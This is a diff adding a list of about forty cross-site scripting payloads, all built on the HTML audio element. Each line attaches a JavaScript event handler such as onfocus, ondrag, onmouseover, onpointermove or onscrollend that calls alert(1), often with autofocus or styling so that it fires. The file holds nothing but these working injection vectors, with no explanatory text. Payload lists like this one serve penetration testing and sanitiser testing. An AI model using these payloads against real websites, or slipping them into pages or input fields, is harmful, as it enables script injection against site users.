@@ -1,0 +1,40 @@
+<audio contenteditable onbeforeinput=alert(1)>test
+<audio controls src=1 onfocus=alert(1) autofocus>
+<audio controls src=1 onfocusin=alert(1) autofocus>
+<audio draggable="true" ondrag="alert(1)" style=display:block>test</audio>
+<audio draggable="true" ondragend="alert(1)" style=display:block>test</audio>
+<audio draggable="true" ondragenter="alert(1)" style=display:block>test</audio>
+<audio draggable="true" ondragleave="alert(1)" style=display:block>test</audio>
+<audio draggable="true" ondragstart="alert(1)" style=display:block>test</audio>
+<audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></audio>
+<audio onafterscriptexecute=alert(1)><script>1</script>
+<audio onbeforescriptexecute=alert(1)><script>1</script>
+<audio onblur=alert(1) id=x tabindex=1 style=display:block>test</audio><input value=clickme>
+<audio onclick="alert(1)" style=display:block>test</audio>
+<audio oncontextmenu="alert(1)" style=display:block>test</audio>
+<audio oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<audio oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<audio ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</audio>
+<audio onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</audio><input value=clickme>
+<audio onkeydown="alert(1)" contenteditable style=display:block>test</audio>
+<audio onkeypress="alert(1)" contenteditable style=display:block>test</audio>
+<audio onkeyup="alert(1)" contenteditable style=display:block>test</audio>
+<audio onmousedown="alert(1)" style=display:block>test</audio>
+<audio onmouseenter="alert(1)" style=display:block>test</audio>
+<audio onmouseleave="alert(1)" style=display:block>test</audio>
+<audio onmousemove="alert(1)" style=display:block>test</audio>
+<audio onmouseout="alert(1)" style=display:block>test</audio>
+<audio onmouseover="alert(1)" style=display:block>test</audio>
+<audio onmouseup="alert(1)" style=display:block>test</audio>
+<audio onmousewheel=alert(1) style=display:block>requires scrolling
+<audio onpointerdown=alert(1) style=display:block>XSS</audio>
+<audio onpointerenter=alert(1) style=display:block>XSS</audio>
+<audio onpointerleave=alert(1) style=display:block>XSS</audio>
+<audio onpointermove=alert(1) style=display:block>XSS</audio>
+<audio onpointerout=alert(1) style=display:block>XSS</audio>
+<audio onpointerover=alert(1) style=display:block>XSS</audio>
+<audio onpointerrawupdate=alert(1) style=display:block>XSS</audio>
+<audio onpointerup=alert(1) style=display:block>XSS</audio>
+<audio onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></audio>
